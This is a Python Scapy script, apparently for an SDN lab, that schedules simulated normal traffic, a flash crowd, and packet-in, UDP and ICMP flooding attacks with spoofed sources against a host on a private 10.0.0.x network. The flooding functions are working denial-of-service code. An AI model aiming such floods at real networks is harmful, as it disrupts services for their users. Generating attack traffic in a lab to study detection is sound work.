from scapy.all import *
import multiprocessing
import time
from utils import *


#########################
# 预设参数
#########################

# 这两个是设置scapy的，可以忽视
# level of verbosity, 0 - mute logging
conf.verb=1
# configure themes for beautiful print
conf.color_theme = RastaTheme()

# 设置给定的ip取值范围
source_ips = [
    '10.0.0.1',
    '10.0.0.2',
    '10.0.0.3',
    '10.0.0.4',
    '10.0.0.5',
    '10.0.0.6',
    '10.0.0.7',
    '10.0.0.8',
    '10.0.0.9',
    '10.0.0.10',
    '10.0.0.11',
    '10.0.0.12'
]

# 设置给定的协议以及对应的权重，即有85%概率选取TCP协议
protocol_list = ['TCP', 'UDP', 'ICMP']
weights = [0.85, 0.1, 0.05]

#########################
# 下面6个函数分别对应6个flow
#########################

def flash_crowd_flow():
    """
    前面这几个flow需要使用while的原因：
    因为需要发不同的包过去，即随机产生要么源，要么目的，要么包长，要么
    协议，所以只能使用while，在循环里面每次产生一个新的包packet，然后发
    过去。但是这样的话，指定速度speed就没有作用了，因为指定速度是一次性的发
    很多个包过去，然后间隔多少秒发一个这样，理论上应该这样使用：
    sendp(packet*1000, inter=speed)
    即，一次性发1000个包过去。但是这样发的包都是一样的，所以也不符合要求。

    使用while实际上是每次只发1个包过去，因此不存在“间隔多少秒发一个”，所以指定speed
    没有用，所以不能保证发包速度。
    """
    print('===== Start Flash Crowd flowing =====')

    # 设定发送速率，即每间隔1/200秒发送一个包，即每秒发200个包
    # 但是速率现在不准
    speed = 1/200
    dest_ip = '10.0.0.12'

    num_packet = 0

    while True:
        # 随机产生一个ip作为源
        # generate random IPs
        src_ip = generate_random_ipv4()
        print(f'Generated source IP address is: {src_ip}')
        
        # 包长为固定所以就直接为空字符串了
        # 协议固定为TCP
        # create TCP packet with empty payload
        packet = IP(src=src_ip, dst=dest_ip) / TCP() / ''

        # 以指定的速率发送这个包
        # send the packet
        sendp(packet, inter=speed)

        num_packet += 1
        print(f'Number of packet sent is: {num_packet}')


def normal_flow_1():
    print('===== Start Normal 1 flowing =====')
    speed = 1/50

    num_packet = 0
    while True:
        # 普通流1从给定的12个ip里随机选一个作为源
        src_ip = generate_random_ip_from_source(source_ips)
        print(f'Generated source IP address is: {src_ip}')

        # 普通流1从给任意非保留的ip里随机选一个作为目的
        dest_ip = generate_random_ipv4()
        print(f'Generated destination IP address is: {dest_ip}')

        # 包长随机-> 随机产生一个长度取值在[5,50]的随机字符串作为模拟的包文 
        # generate random payload of length from [5, 50]
        random_payload = generate_random_payload(5, 50)

        # 根据上面设置的权重，随机选取一个协议，即有85%的概率这个协议是TCP
        # generate random protocol
        random_protocol = generate_random_protocol(protocol_list, weights)
        print(f'Generated protocol is: {random_protocol}')

        # 根据随机选取的协议，初始化不同的协议对象
        if random_protocol == 'TCP':
            protocol = TCP()
        elif random_protocol == 'UDP':
            protocol = UDP()
        elif random_protocol == 'ICMP':
            protocol = ICMP()

        # 用随机产生的源，地址，包长和协议创建一个包
        # create TCP packet with empty payload
        packet = IP(src=src_ip, dst=dest_ip) / protocol / random_payload

        # 发送这个包
        # send the packet
        sendp(packet, inter=speed)

        num_packet += 1
        print(f'Number of packet sent is: {num_packet}')


def normal_flow_2():
    print('===== Start Normal 2 flowing =====')
    speed = 1/50

    num_packet = 0
    while True:
        src_ip = generate_random_ipv4()
        print(f'Generated source IP address is: {src_ip}')

        dest_ip = generate_random_ip_from_source(source_ips)
        print(f'Generated destination IP address is: {dest_ip}')

        # generate random payload of length from [5, 50]
        random_payload = generate_random_payload(5, 50)

        # generate random protocol
        random_protocol = generate_random_protocol(protocol_list, weights)
        print(f'Generated protocol is: {random_protocol}')

        if random_protocol == 'TCP':
            protocol = TCP()
        elif random_protocol == 'UDP':
            protocol = UDP()
        elif random_protocol == 'ICMP':
            protocol = ICMP()

        # create TCP packet with empty payload
        packet = IP(src=src_ip, dst=dest_ip) / protocol / random_payload
        # send the packet
        sendp(packet, inter=speed)

        num_packet += 1
        print(f'Number of packet sent is: {num_packet}')


def packet_in_flow():
    print('===== Start Packet-in Attack =====')
    speed = 1/200
    # 源固定为这个
    src_ip = '10.0.0.2'

    num_packet = 0
    while True:
        # generate random IPs
        dest_ip = generate_random_ipv4()
        print(f'Generated destination IP address is: {dest_ip}')

        # 协议不指定，包长固定
        # create packet with empty payload
        packet = IP(src=src_ip, dst=dest_ip) / ''
        # send the packet
        sendp(packet, inter=speed)

        num_packet += 1
        print(f'Number of packet sent is: {num_packet}')


def UDP_flooding_flow():
    """
    因为UDP和ICMP flooding都是固定的源，目的，包长和协议，因此发的包都是
    一样的，所以直接设置count=-1，代表发无限个包过去，因此也不需要while了
    """

    print('===== Start UDP Flooding Attack =====')
    speed = 1/200
    src_ip = '10.0.0.4'
    dest_ip = '10.0.0.12'

    # num_packet = 0
    # while True:
    # create UDP packet with empty payload
    packet = IP(src=src_ip, dst=dest_ip) / UDP() / ''

    # count表示发送多少个包过去，-1代表发送无限个包，因此这里不需要用while
    # send the packet
    sendp(packet, inter=speed, count=-1)

    # num_packet += 1
    # print(f'Number of packet sent is: {num_packet}')


def ICMP_flooding_flow():
    print('===== Start ICMP Flooding Attack =====')
    speed = 1/200
    src_ip = '10.0.0.8'
    dest_ip = '10.0.0.12'

    # num_packet = 0
    # while True:
    print('ICMP')
    # create UDP packet with empty payload
    packet = IP(src=src_ip, dst=dest_ip) / ICMP() / ''

    # count表示发送多少个包过去，-1代表发送无限个包，因此这里不需要用while
    # send the packet
    sendp(packet, inter=speed, count=-1)

    # num_packet += 1
    # print(f'Number of packet sent is: {num_packet}')
    
    

# 程序从这里开始执行
if __name__ == "__main__":
    # 开始计时
    tic = time.time()

    # 创建6个进程，即每一个flow都单独由一个进程操控
    # 我们现在在主进程，用来操控这6个自进程
    # create process for each network flow
    p1 =  multiprocessing.Process(target=flash_crowd_flow)
    p2 =  multiprocessing.Process(target=normal_flow_1)
    p3 =  multiprocessing.Process(target=normal_flow_2)
    p4 =  multiprocessing.Process(target=packet_in_flow)
    p5 =  multiprocessing.Process(target=UDP_flooding_flow)
    p6 =  multiprocessing.Process(target=ICMP_flooding_flow)
    
    # 开启p1,p2,p3，即开启闪拥，普1，普2
    # 他们都开始无限的发包了
    # start process
    p1.start()
    p2.start()
    p3.start()

    # 5s之后，开启p4，即开启packet-in攻击
    # packet-in开始无限发包了，同时p123也在后台无限继续发包
    time.sleep(5)
    p4.start()

    # 再过3s后，开启p5，即开启UDP flooding攻击
    time.sleep(3)
    p5.start()
    
    # 再过10s之后，停止p4，即停止packet-in攻击
    # packet-in停止发包了，但是p1,2,3,5仍然在后台无限继续发包
    time.sleep(10)
    p4.terminate()

    # 再过2s之后，停止p5，即停止UDP flooding攻击
    # UDP flooding停止发包了，但是p1,2,3仍然在后台无限继续发包
    time.sleep(2)
    p5.terminate()
    
    # 再过3s之后，开启p6，即开启ICMP flooding攻击
    time.sleep(3)
    p6.start()

    # 再过2s之后，停止p6，即停止ICMP flooding攻击
    # ICMP flooding停止发包了，但是p1,2,3仍然在后台无限继续发包
    time.sleep(2)
    p6.terminate()


    
    # 又过了5s，关闭p1,2,3
    # terminate process
    time.sleep(5)
    p1.terminate()
    p2.terminate()
    p3.terminate()

    # join each process back to main process
    p1.join()
    p2.join()
    p3.join()
    p4.join()
    p5.join()
    p6.join()

    # 全部花费的时间
    toc = time.time()
    print('Done in {:.4f} seconds'.format(toc-tic))